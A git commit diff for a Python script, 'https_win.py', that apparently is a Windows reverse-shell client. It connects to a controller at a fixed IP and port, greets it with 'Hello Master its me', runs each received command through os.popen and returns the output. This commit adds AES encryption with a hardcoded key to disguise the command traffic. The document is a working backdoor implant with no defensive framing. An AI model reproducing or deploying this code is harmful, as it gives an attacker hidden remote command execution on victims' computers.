ede07cea7de83308a0a07c784a7b94790530e484
Nelson Maligro <nelsonmaligro@hotmail.com>
2018-10-17 00:35:03 -0400

    release 1

--- https_win.py
+++ https_win.py
@@ -1,13 +1,23 @@
-import socket, sys, select, os
+import socket, sys, select, os, random, string
+from Crypto.Cipher import AES
 
+#initialize encryption
+iv = ''.join([chr(random.randint(0, 0xFF)) for i in range(16)])
+ncrypt = AES.new ('torjak#69maligro', AES.MODE_CBC, iv)
+
+#initialize socket
 ipaddr = "192.168.32.195"
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 sock.connect ((ipaddr, 6969))
-#sock.setblocking(0)
-sock.send("Hello Master its me: " + ipaddr)
+#Send initial connection message
+cmd = "Hello Master its me: " + ipaddr
+if (len(cmd) % 16 != 0):
+    cmd += ' ' * (16 - len(cmd) % 16) # <- padded with spaces
+
+cmd = ncrypt.encrypt(cmd)
+sock.send(cmd)
 while (1):
-	cmd =''
 	try:
  		read, write, err = select.select([sock],[], [])
 		for IO in read:
@@ -15,7 +25,13 @@ while (1):
 				data = sock.recv(4096)
 				if data:
 					print ('received: ' + data)
+					data = ncrypt.decrypt(data)
+					data = data.rstrip()
+					print ('decoded: ' + data)
 					cmd = os.popen(data).read()
+					if (len(cmd) % 16 != 0):
+            					cmd += ' ' * (16 - len(cmd) % 16) # <- padded with spaces
+					cmd = ncrypt.encrypt(cmd)
 					sock.send(cmd)
 				else:
 					sock.close()
